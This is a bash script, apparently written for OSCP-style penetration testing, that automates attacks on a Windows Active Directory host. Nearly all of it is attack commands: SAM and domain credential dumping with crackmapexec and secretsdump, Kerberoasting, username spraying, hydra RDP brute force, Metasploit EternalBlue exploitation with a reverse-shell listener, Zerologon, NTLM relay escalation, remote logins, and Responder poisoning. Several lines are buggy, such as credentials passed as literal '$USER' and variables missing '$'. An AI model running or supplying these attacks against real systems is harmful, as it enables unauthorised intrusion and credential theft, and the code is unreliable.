#!/bin/bash

# May need to change location of Impacket if not within PATH

echo -e '\E[31;40m' "Made by OvergrownCarrot1, thanks for using"
echo ""
echo -e '\E[31;35m' "This script looks at other tools, you need both impacket and crackmapexec downloaded and in $PATH to work correctly"
sleep 2
echo ""
echo -e '\E[31;35m' "If you do not know all the information below then leave blank, the more information the more enumeration will happen, may need to run multiple times and check the $DOMAINIP.txt file for more information"; tput sgr0
sleep 2
echo ""
echo -e '\E[31;40m' "Script is not stuck, it is saving everything to a text file, kerbrute may take a very long time depending on wordlist if using xato-net-10-million-usernames be very patient"; tput sgr0
sleep 2
echo ""

read -p "Lets start off with the important questions NIN? (Not streamer friendly since that is like a thing or something) (y/n)" answer
if [ $answer = y ] ; then
	read -p "My Homie... what song (closer/perfect/head/hand)?" answer
	if [ $answer = closer ] ; then
		echo "You dirty dog you"
		xdg-open https://youtube.com/watch?v=ccY25Cb3im0
	elif [ $answer = perfect ] ; then
		echo "Classic!"
		xdg-open https://youtube.com/watch?v=dn3j6-yQKWQ
	elif [ $answer = head ] ; then
		echo "Bow down before the one you serve..."
		xdg-open https://youtube.com/watch?v=ao-Sahfy7Hg
	elif [ $answer = hand ] ; then
		echo "Dont bite"
		xdg-open https://youtube.com/watch?v=xwhBRJStz7w
	else 
		echo "I am not going to type out every song come on man"
	fi
fi

echo ""
echo -e '\E[31;40m' "Domain Name"; tput sgr0
read DOMAIN 

echo -e '\E[31;40m' "Domain IP"; tput sgr0
read DOMAINIP

echo -e '\E[31;40m' "Username"; tput sgr0 
read USER 

echo -e '\E[31;40m' "Password"; tput sgr0
read PASS

read -p "If you do not have a userfile already would you like to try GetADUsers.py to make a userfile? (y/n):" answer
if [ $answer = y ] ; then
	GetADUsers.py -all -dc-ip $DOMAINIP > $DOMAINIP.users.txt
	echo -e '\E[31;40m' "Saved to $DOMAINIP.users.txt"
elif [ $answer = n ] ; then
	echo -e '\E[31;40m' "User File if any"; tput sgr0
	read USERFILE
else
	echo ""
fi

echo -e '\E[31;35m' "Running NMAP to see what is open and putting in $DOMAINIP.txt, only looking at certain ports"; tput sgr0

nmap -p 21,25,139,445,80,8080,8888,111,3389,5985,135,53,593,3269,636,389,88,2049,1521,3306,1433 -vv -Pn -n -T4 $DOMAINIP > $DOMAINIP.txt
cat $DOMAINIP.txt | grep open > $DOMAINIP.open.txt
rm -rf $DOMAINIP.txt
mv $DOMAINIP.open.txt $DOMAINIP.txt

echo ""

echo -e '\E[31;35m' "Saving everything to $DOMAINIP.txt"; tput sgr0

if [ $USER ] && [ $PASS ]
then
	read -p "Since you provided a Username and Password would you like to try some crackmapexec stuff? (y/n)" answer
	if [ $answer = y ] ; then
		echo -e '\E[31;35m' "Trying Command Injection with whoami"; tput sgr0
		crackmapexec $DOMAINIP -u '$USER' -p '$PASS' -x whoami >> $DOMAINIP.txt
		echo -e '\E[31;35m' "Trying PowerShell Injection with whoami"; tput sgr0
		crackmapexec $DOMAINIP -u '$USER' -p '$PASS' -X whoami >> $DOMAINIP.txt
		echo -e '\E[31;35m' "Checking for logged in users" ; tput sgr0
		crackmapexec $DOMAINIP -u '$USER' -p '$PASS' --local-auth >> $DOMAINIP.txt
		echo -e '\E[31;35m' "Trying to enumerate shares" ; tput sgr0
		crackmapexec $DOMAINIP -u '$USER' -p '$PASS' --local-auth --shares >> $DOMAINIP.txt
		echo -e '\E[31;35m' "Trying to enable WDigest for LSA password dump in clear text" ; tput sgr0
		crackmapexec $DOMAINIP -u '$USER' -p '$PASS' --local-auth --wdigest enable >> $DOMAINIP.txt
		echo -e '\E[31;35m' "Checking password policy" ; tput sgr0 
		crackmapexec $DOMAINIP -u '$USER' -p '$PASS' --local-auth --pass-pol >> $DOMAINIP.txt
		echo -e '\E[31;35m' "RID Brute Forcing" ; tput sgr0 
		crackmapexec $DOMAINIP -u '$USER' -p '$PASS' --rid-brute >> $DOMAINIP.txt
		echo -e '\E[31;35m' "Trying to dump local SAM hashes" ; tput sgr0 
		crackmapexec $DOMAINIP -u '$USER' -p '$PASS' --local-auth --sam >> $DOMAINIP.txt
	elif [ $answer = n ] ; then
		echo -e '\E[31;35m' "Continuing Script"; tput sgr0
	else 
		echo ""
	fi
else
	echo ""
fi

if grep 88/tcp $DOMAINIP.txt
then
	echo "IP may be a domain controller, port 88 is open"
	read -p "Try one of the following, type answer (kerberoasting(ki)/kerbrute(kb)/all(a)/none(n) ex: ki)" answer
	if [ $answer = ki ] ; then
		GetNPUsers.py DOMAIN/ -no-pass -usersfile $USERFILE -dc-ip $DOMAINIP >> $DOMAINIP.txt
	elif [ $answer = kb ] ; then
		echo -e '\E[31;35m' "Kerbrute location ex: (/home/kali/kerbrute/dist/kerbrute_linux_amd64)"; tput sgr0
		read KERLOC
		echo -e '\E[31;35m' "Kerbrute username file ex: (/usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt)"; tput sgr0
		read KERUSER
		echo -e '\E[31;35m' "Keberos Username Spray"; tput sgr0
		$KERLOC userenum $KERUSER --dc $DOMAINIP -d $DOMAIN -t 200 >> $DOMAINIP.txt
	elif [ $answer = a ] ; then
		nmap -p 88 $DOMAINIP --script=krb5-enum-users.nse -Pn -vv
		GetADUsers.py -all "$DOMAIN/$USER" -dc-ip $DOMAINIP >> $DOMAINIP.txt
		GetNPUsers.py $DOMAIN/ -no-pass -usersfile $USERFILE -dc-ip $DOMAINIP >> $DOMAINIP.txt
		echo -e '\E[31;35m' "Kerbrute location ex: (/home/kali/kerbrute/dist/kerbrute_linux_amd64)"; tput sgr0
		read KERLOC
		echo -e '\E[31;35m' "Kerbrute username file ex: (/usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt)"; tput sgr0
		read KERUSER
		echo -e '\E[31;35m' "Keberos Username Spray"; tput sgr0
		$KERLOC userenum $KERUSER --dc $DOMAINIP -d $DOMAIN -t 200 >> $DOMAINIP.txt
	elif [ $answer = n ] ; then
		echo -e '\E[31;35m' "Will not try Kerberoasting or Kerbrute"; tput sgr0
	else
		echo -e '\E[31;35m' "Not an answer or you spelled something wrong"; tput sgr0
	fi
fi	
sleep 1

if grep 21/tcp $DOMAINIP.txt
then
	echo -e '\E[31;35m' "FTP is open running another scan on it"; tput sgr0
	nmap -p 21 -sC -sV -vv $DOMAINIP -Pn >> $DOMAINIP.txt
fi
sleep 1

if grep 25/tcp $DOMAINIP.txt
then
	echo -e '\E[31;35m' "SMTP is running, utilizing NMAP to see some stuff"; tput sgr0
	nmap --script=smtp* $DOMAINIP -Pn -vv -sC -sV -p 25 >> $DOMAINIP.txt
fi
sleep 1

if grep 389/tcp $DOMAINIP.txt
then
	echo -e '\E[31;35m' "LDAP is open trying ldapdomaindump and ldapsearch"; tput sgr0
	echo -e '\E[31;35m' "Creating new directory to put any information found into $DOMAINIP.ldap"; tput sgr0
	mkdir $DOMAINIP.ldap
	cd $DOMAINIP.ldap
	ldapdomaindump ldap://$DOMAINIP:389 
	cd ..
	ldapsearch -H ldap://$DOMAINIP -x -b "DC=$DOMAIN,DC=local" '(objectclass=person)' >> $DOMAINIP.txt
fi
sleep 1

if grep 53 $DOMAINIP.txt
then
	echo -e '\E[31;35m' "DNS is running, trying dig and some other stuff"; tput sgr0
	nmap $DOMAINIP -p 53 -vv -sV -sC -Pn --script=dns-zone-transfer.nse,dns-brute.nse >> $DOMAINIP.txt
	dig $DOMAIN @$DOMAINIP any >> $DOMAINIP.txt
fi
sleep 1

if grep 80/tcp $DOMAINIP.txt
then
	echo -e '\E[31;35m' "Web Server is running, trying some scripts"; tput sgr0
	nmap $DOMAINIP --script=http-vuln*,http-enum -p 80 -sC -sV -Pn >> $DOMAINIP.txt
	read -p "Would you like to run a feroxbuster with big.txt, may take a while? (y/n)" answer
	if [ $answer = y ] ; then
		feroxbuster -u http://$DOMAINIP -w /usr/share/wordlists/dirb/big.txt >> $DOMAINIP.txt
	elif [ $answer = n ] ; then
		echo -e '\E[31;35m' "Continuing Script"
	else
		echo -e '\E[31;35m' "Need a y or n"
	fi
fi
sleep 1

if [ $USER ] && [ $PASS ] && [ $DOMAIN ] && [ $DOMAINIP ]
then
	echo -e '\E[31;35m' "Getting Users SPNs if we can"; tput sgr0
	GetUserSPNs.py "$DOMAIN/$USER:$PASS" -dc-ip $DOMAINIP >> $DOMAINIP.txt
	GetUserSPNs.py "$DOMAIN/$USER:$PASS" -dc-ip $DOMAINIP -request >> $DOMAINIP.txt
	sleep 1
	echo -e '\E[31;35m' "Looking up SID"; tput sgr0
	lookupsid.py "$DOMAIN/$USER:$PASS@$DOMAINIP" >> $DOMAINIP.txt
	sleep 1
	echo -e '\E[31;35m' "Trying to get Secrets Dump"; tput sgr0
	secretsdump.py "$DOMAIN/$USER:$PASS@$DOMAINIP" -just-dc >> $DOMAINIP.txt
	sleep 1
else
	echo ""
fi
sleep 1

if grep 111/tcp $DOMAINIP.txt
then
	echo -e '\E[31;35m' "RPC is open, checking to see if anonymous login is allowed"; tput sgr0
	rpcclient -U "" -N DOMAINIP >> $DOMAINIP.txt
	rpcinfo -p $DOMAINIP >> $DOMAINIP.txt
fi
sleep 1

if grep 445/tcp $DOMAINIP.txt
then
	echo -e '\E[31;35m' "Checking if SMB is vulnerable to anything"; tput sgr0
	nmap -p 445 --script=smb-vuln-* -Pn $DOMAINIP >> $DOMAINIP.txt
	smbclient -L \\\\$DOMAINIP\\ 
	enum4linux $DOMAINIP >> $DOMAINIP.txt
	enum4linux -u $USER -p PASS -a $DOMAINIP >> $DOMAINIP.txt
fi
sleep 1

if grep "CVE:CVE-2017-0143" $DOMAINIP.txt
then
	echo -e '\E[31;40m'"Most likley vulnerable to Eternal Blue"
	read -p "Would you like to automatically exploit Eternal Blue with Metasploit? MAY NOT BE ALLOWED FOR OSCP (y/n)" answer
	if [ $answer = y ] ; then
		echo "LHOST?"
		read LHOST
		echo "LPORT?"
		read LPORT
		msfconsole -x "use exploit/windows/smb/ms17_010_eternalblue; set LHOST $LHOST;set RHOSTS $DOMAINIP; set LPORT $LPORT; exploit"
	fi
fi
sleep 1

if grep 1521/tcp $DOMAINIP.txt
then
	echo -e '\E[31;35m' "Oracle database is running, testing some stuff"; tput sgr0
	tnscmd10g version -h $DOMAINIP >> $DOMAINIP.txt
	tnscmd10g status -h $DOMAINIP >> $DOMAINIP.txt
fi
sleep 1

if grep 3306/tcp $DOMAINIP.txt
then
	echo -e '\E[31;35m' "MySQL is open, trying some stuff"; tput sgr0
	nmap --script=mysql-* >> DOMAINIP.txt
fi
sleep 1

if grep 2049/tcp $DOMAINIP.txt
then
	echo -e '\E[31;35m' "NFS Share is running"; tput sgr0
	showmount -e $DOMAINIP >> $DOMAINIP.txt
fi
sleep 1

if grep 1433/tcp $DOMAINIP.txt
then
	echo -e '\E[31;35m' "MSSQL is running, checking some things"; tput sgr0
	sqsh -s $DOMAINIP -U sa >> $DOMAINIP.txt
fi
sleep 1

echo -e '\E[31;40m' "Testing if vulnerable to Print Nightmare"; tput sgr0
impacket-rpcdump @$DOMAINIP | egrep 'MS-RPRN|MS-PAR' >> $DOMAINIP.txt
impacket-rpcdump @$DOMAIN | egrep 'MS-RPRN|MS-PAR' >> $DOMAINIP.txt
sleep 1

read -p "Test for Zero Logon? (y/n)" answer
if [ $answer = y ] ; then
	echo -e '\E[31;40m' "Testing if vulnerable to Zero Logon (this may take some time)"; tput sgr0
	echo -e '\E[31;40m' "Location of zerologon.py? ex: (~/Tools/zerologon.py)"; tput sgr0
	read ZEROLOC
	echo -e '\E[31;40m' 'SMB Share Name?'; tput sgr0
	read SHARENAME
	python3 $ZEROLOC "$SHARENAME" "$DOMAINIP" 
fi

read -p "Test for Login Brute Force through Crackmapexec SMB? (y/n)" answer
if [ $answer = y ] ; then
	echo -e '\E[31;40m' "Testing for brute force with username and pass file"; tput sgr0
	echo -e '\E[31;40m' "Username or username file to test?"; tput sgr0
	read USERNAME
	echo -e '\E[31;40m' "Location of password file ex: (/usr/share/wordlists/fasttrack.txt)"; tput sgr0
	read PASSFILE
	crackmapexec smb $DOMAINIP -u $USERNAME -p $PASSFILE -d $DOMAIN --continue-on-success >> $DOMAINIP.txt
fi

if grep 5985/tcp $DOMAINIP.txt
then
	read -p "Test for Evil-WinRM Login? (y/n)" answer
	if [ $answer = y ] ; then
		echo -e '\E[31;40m' "Username to test?"; tput sgr0
		read EVILUSER
		echo -e '\E[31;40m' "Password to use?"; tput sgr0
		read EVILPASS
		evil-winrm -u $EVILUSER -p $EVILPASS -i $DOMAINIP
	elif [ $answer = n ] ; then
		echo "Not trying Evil-WinRM Login"
	fi
fi

read -p "Test for PSExec Login (y/n)" answer
if [ $answer = y ] ; then
	echo -e '\E[31;40m' "Username to test?"; tput sgr0
	read PSUSER
	echo -e '\E[31;40m' "Password to test?"; tput sgr0
	read PSPASS
	psexec.py "$DOMAIN/$PSUSER:$PSPASS@$DOMAINIP"
fi

read -p "Try and escalate user with ntlmrealyx.py? (y/n)" answer
if [ $answer = y ] ; then
	echo -e '\E[31;40m' "User to test?"; tput sgr0
	read NTLMUSER
	ntlmrealyx.py -t ldap://$DOMAINIP --escalate-user $NTLMUSER
fi

if grep 3389/tcp $DOMAINIP.txt
then
	read -p "RDP is open try and brute force? (knownuser(ku)/knownpassword(kp)/unknown(u)/no(n) ex ku)"
	if [ $answer = ku ] ; then
		echo -e '\E[31;40m' "User to test?"; tput sgr0
		read KNOWNUSER
		echo -e '\E[31;40m' "Password File? ex (/usr/share/wordlists/fasttrack.txt)"
		read HYDRAPASS
		hydra -l $KNOWNUSER -P $HYDRAPASS rdp://$DOMAINIP:3389 >> $DOMAINIP.txt
	elif [ $answer = kp ] ; then
		echo -e '\E[31;40m' "Username File?"; tput sgr0
		read HYDRAUSER
		echo -e '\E[31;40m' "Password to test?"; tput sgr0
		read KNOWNPASS
		hydra -L $HYDRAUSER -p $KNOWNPASS rdp://$DOMAINIP:3389 >> $DOMAINIP.txt
	elif [ $answer = u ] ; then
		echo -e '\E[31;40m' "Ok... Goodluck I guess"; tput sgr0
		echo -e '\E[31;40m' "Username File?"; tput sgr0
		read HYDRAUSER
		echo -e '\E[31;40m' "Password File? ex (/usr/share/wordlists/fasttrack.txt)"
		read HYDRAPASS
		hydra -L HYDRAUSER -P HYDRAPASS rdp://$DOMAINIP:3389 >> $DOMAINIP.txt
	elif [ $answer = n ] ; then
		echo "Not brute forcing RDP, continuing script"
	else
		echo "No idea what you want from me"
	fi
fi

read -p "Do you want to run external Bloodhound? (y/n)" answer
if [ $answer = y ] ; then
	read -p "Do you have bloodhound-python installed? (y/n)"
	if [ $answer = y ] ; then
		echo -e '\E[31;40m' "Username?";tput sgr0
		read BLOODUSER
		echo -e '\E[31;40m' "Password?"; tput sgr0
		read BLOODPASS
		bloodhound-python -u BLOODUSER -p BLOODPASS -ns $DOMAINIP -d $DOMAIN -c all
	elif [ $answer = n ] ; then
		echo -e '\E[31;40m' "Installing bloodhound-python"
		pip3 install bloodhound
		echo -e '\E[31;40m' "Username?";tput sgr0
		read BLOODUSER
		echo -e '\E[31;40m' "Password?"; tput sgr0
		read BLOODPASS
		bloodhound-python -u BLOODUSER -p BLOODPASS -ns $DOMAINIP -d $DOMAIN -c all
	else
		echo "Not a valid answer"
	fi
fi

read -p "Do you want to open a new tab for responder? (y/n)" answer
if [ $answer = y ] ; then
	echo -e '\E[31;40m' "Interface to run responder on ex: (eth1)?"; tput sgr0 
	read INT
	xterm -e "sudo responder -I $INT -rdwv;bash"
fi
